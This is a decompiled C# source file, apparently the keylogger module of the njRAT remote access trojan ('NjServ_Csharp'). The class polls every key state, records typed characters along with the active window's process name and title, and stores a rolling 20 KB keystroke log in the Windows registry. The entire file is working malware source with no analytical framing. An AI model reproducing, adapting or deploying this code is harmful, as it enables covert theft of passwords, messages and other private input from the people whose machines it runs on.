using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
namespace NjServ_Csharp
{
	// Token: 0x02000003 RID: 3
	public class kl
	{
		// Token: 0x06000023 RID: 35 RVA: 0x00004678 File Offset: 0x00002878
		public kl()
		{
			this.lastKey = Keys.None;
			this.Logs = "";
			this.vn = "[kl]";
		}

		// Token: 0x0600002A RID: 42 RVA: 0x000046A0 File Offset: 0x000028A0
		private string AV()
		{
			try
			{
				IntPtr foregroundWindow = OK.GetForegroundWindow();
                int processId = 0;
                kl.GetWindowThreadProcessId(foregroundWindow,ref processId);
				Process processById = Process.GetProcessById(processId);
				if (!((foregroundWindow.ToInt32() == this.LastAV & Operators.CompareString(this.LastAS, processById.MainWindowTitle, false) == 0) | processById.MainWindowTitle.Length == 0))
				{
					this.LastAV = foregroundWindow.ToInt32();
					this.LastAS = processById.MainWindowTitle;
					return string.Concat(new string[]
					{
						"\r\n\u0001",
						DateAndTime.Now.ToString("yy/MM/dd "),
						processById.ProcessName,
						" ",
						this.LastAS,
						"\u0001\r\n"
					});
				}
			}
			catch (Exception expr_C2)
			{
				ProjectData.SetProjectError(expr_C2);
				ProjectData.ClearProjectError();
			}
			return "";
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000483C File Offset: 0x00002A3C
		private string Fix(Keys k)
		{
			bool flag = OK.F.Keyboard.ShiftKeyDown;
			if (OK.F.Keyboard.CapsLock)
			{
				if (flag)
				{
					flag = false;
				}
				else
				{
					flag = true;
				}
			}
			checked
			{
				string result;
				try
				{
					if (k == Keys.Delete || k == Keys.Back)
					{
						result = "[" + k.ToString() + "]";
					}
					else if (k == Keys.LShiftKey || k == Keys.RShiftKey || k == Keys.Shift || k == Keys.ShiftKey || k == Keys.Control || k == Keys.ControlKey || k == Keys.RControlKey || k == Keys.LControlKey || k == Keys.Alt || k == Keys.F1 || k == Keys.F2 || k == Keys.F3 || k == Keys.F4 || k == Keys.F5 || k == Keys.F6 || k == Keys.F7 || k == Keys.F8 || k == Keys.F9 || k == Keys.F10 || k == Keys.F11 || k == Keys.F12 || k == Keys.End)
					{
						result = "";
					}
					else if (k == Keys.Space)
					{
						result = " ";
					}
					else if (k == Keys.Return || k == Keys.Return)
					{
						if (this.Logs.EndsWith("[ENTER]\r\n"))
						{
							result = "";
						}
						else
						{
							result = "[ENTER]\r\n";
						}
					}
					else if (k == Keys.Tab)
					{
						result = "[TAP]\r\n";
					}
					else if (flag)
					{
						result = kl.VKCodeToUnicode((uint)k).ToUpper();
					}
					else
					{
						result = kl.VKCodeToUnicode((uint)k);
					}
				}
				catch (Exception expr_148)
				{
					ProjectData.SetProjectError(expr_148);
					if (flag)
					{
						result = Strings.ChrW((int)k).ToString().ToUpper();
						ProjectData.ClearProjectError();
					}
					else
					{
						result = Strings.ChrW((int)k).ToString().ToLower();
						ProjectData.ClearProjectError();
					}
				}
				return result;
			}
		}

		// Token: 0x06000029 RID: 41
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern short GetAsyncKeyState(int a);

		// Token: 0x06000028 RID: 40
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetKeyboardLayout(int a);

		// Token: 0x06000025 RID: 37
		[DllImport("user32.dll")]
		private static extern bool GetKeyboardState(byte[] a);

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr a, ref int b);

		// Token: 0x06000026 RID: 38
		[DllImport("user32.dll")]
		private static extern uint MapVirtualKey(uint a, uint b);

		// Token: 0x06000024 RID: 36
		[DllImport("user32.dll")]
		private static extern int ToUnicodeEx(uint a, uint b, byte[] c, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder d, int e, uint f, IntPtr g);

		// Token: 0x0600002B RID: 43 RVA: 0x00004798 File Offset: 0x00002998
		private static string VKCodeToUnicode(uint a)
		{
			try
			{
				StringBuilder stringBuilder = new StringBuilder();
				byte[] array = new byte[255];
				string result;
				if (!kl.GetKeyboardState(array))
				{
					result = "";
					return result;
				}
				uint b = kl.MapVirtualKey(a, 0u);
				IntPtr foregroundWindow = OK.GetForegroundWindow();
				IntPtr arg_3B_0 = foregroundWindow;
				int num = 0;
				int windowThreadProcessId = kl.GetWindowThreadProcessId(arg_3B_0, ref num);
				IntPtr g = (IntPtr)kl.GetKeyboardLayout(windowThreadProcessId);
				kl.ToUnicodeEx(a, b, array, stringBuilder, 5, 0u, g);
				result = stringBuilder.ToString();
				return result;
			}
			catch (Exception expr_68)
			{
				ProjectData.SetProjectError(expr_68);
				ProjectData.ClearProjectError();
			}
			return (checked((Keys)a)).ToString();
		}

		// Token: 0x0600002D RID: 45 RVA: 0x000049F0 File Offset: 0x00002BF0
		public void WRK()
		{
			this.Logs = Conversions.ToString(OK.GTV(this.vn, ""));
			checked
			{
				try
				{
					int num = 0;
					while (true)
					{
						num++;
						int num2 = 0;
						do
						{
							if (kl.GetAsyncKeyState(num2) == -32767 & !OK.F.Keyboard.CtrlKeyDown)
							{
								Keys k = (Keys)num2;
								string text = this.Fix(k);
								if (text.Length > 0)
								{
									this.Logs += this.AV();
									this.Logs += text;
								}
								this.lastKey = k;
							}
							num2++;
						}
						while (num2 <= 255);
						if (num == 1000)
						{
							num = 0;
							int num3 = Conversions.ToInteger("20") * 1024;
							if (this.Logs.Length > num3)
							{
								this.Logs = this.Logs.Remove(0, this.Logs.Length - num3);
							}
							OK.STV(this.vn, this.Logs, RegistryValueKind.String);
						}
						Thread.Sleep(1);
					}
				}
				catch (Exception expr_FD)
				{
					ProjectData.SetProjectError(expr_FD);
					ProjectData.ClearProjectError();
				}
			}
		}

		// Token: 0x0400001A RID: 26
		private string LastAS;

		// Token: 0x04000019 RID: 25
		private int LastAV;

		// Token: 0x0400001B RID: 27
		private Keys lastKey;

		// Token: 0x0400001C RID: 28
		public string Logs;

		// Token: 0x0400001D RID: 29
		public string vn;
	}
}
